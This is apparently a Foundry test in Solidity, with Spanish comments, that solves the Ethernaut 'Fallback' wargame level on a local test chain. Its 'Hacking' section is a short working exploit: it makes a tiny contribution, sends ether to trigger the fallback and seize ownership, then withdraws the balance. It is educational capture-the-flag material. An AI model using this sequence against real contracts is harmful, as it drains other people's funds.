// SPDX-License-Identifier: UNLICENSED
pragma solidity >= 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../Ethernaut.sol";
import "./FallbackFactory.sol";
import "./Fallback.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D)); // Como una blockchain local
    Ethernaut ethernaut; // EL juego de ethernauta

    address myAddress = address(10);

    function setUp() public {
        vm.deal(myAddress, 5 ether);
        ethernaut = new Ethernaut();
    }

    function testFallback() public {
        // Setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);

        vm.startPrank(myAddress);

        address level = ethernaut.createLevelInstance(fallbackFactory);

        // Hacking
        Fallback(payable(level)).contribute{value: 1}();

        (bool success, bytes memory data) = level.call{value: 1}("");
        
        Fallback(payable(level)).withdraw();
                
        // Assert
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(level));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}